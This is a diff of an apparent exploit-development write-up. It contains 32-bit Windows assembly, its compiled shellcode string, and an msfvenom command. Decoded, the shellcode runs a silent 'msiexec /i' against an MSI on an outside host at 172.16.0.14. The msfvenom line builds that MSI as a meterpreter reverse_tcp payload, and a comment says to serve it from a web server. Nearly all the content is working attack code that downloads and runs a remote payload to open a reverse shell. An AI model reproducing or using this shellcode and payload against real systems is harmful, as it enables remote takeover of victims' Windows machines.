@@ -10,13 +10,10 @@ Following asm does this;
 ------------assembly starts---------------
 
 BITS 32
-
 global _start
-
 _start:
 
 			 ;determine LoadLibrary, ExitProcess & System via Arwin, or follow write-up
-
 mov ebx, 0x777fde35      ;Address of function LoadLibraryA (win7)
 call ebx
 mov ebp, eax             ;msvcrt.dll is saved in ebp
@@ -46,8 +43,7 @@ call eax
 
 --------------assembly end----------------------------------
 
-
-Save as .asm
+Save as msi.asm
 
 
 xvz@xvz-PC ~
@@ -87,10 +83,9 @@ xvz@xvz-PC ~
 $ ./xxd-shellcode.sh msi.bin
 
 "\xbb\x35\xde\x7f\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x73\x6f\x6e\x6d\x68\x34\x2f\x6a\x61\x68\x2e\x30\x2e\x31\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x37\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x8d\x76\xff\xd0\x31\xc0\x50\xb8\x5a\xbe\x80\x77\xff\xd0"
+# add to script
 
-
+# Create MSI
 #msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.0.14 -f msi -o jasonm.msi
 
-
-
-# add to script
+# Start web-server port 80
